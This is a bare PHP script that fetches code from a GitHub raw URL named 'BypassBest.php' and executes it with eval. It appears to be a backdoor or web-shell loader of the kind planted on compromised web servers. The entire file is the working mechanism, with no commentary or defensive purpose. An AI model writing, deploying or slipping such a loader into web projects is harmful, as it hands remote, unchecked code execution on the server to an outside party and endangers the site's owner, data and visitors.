<?php

ob_start();

$remoteUrl = "https://raw.githubusercontent.com/shadows009/secreet-items/refs/heads/main/BypassBest.php";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    ob_end_clean();
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);

if ($remoteCode === false || trim($remoteCode) === '') {
    ob_end_clean();
    die('Failed to load remote code.');
}


try {
    eval("?>$remoteCode");
} catch (Throwable $e) {
    ob_end_clean();
    die('Error in remote code execution: ' . $e->getMessage());
}

ob_end_flush();
?>
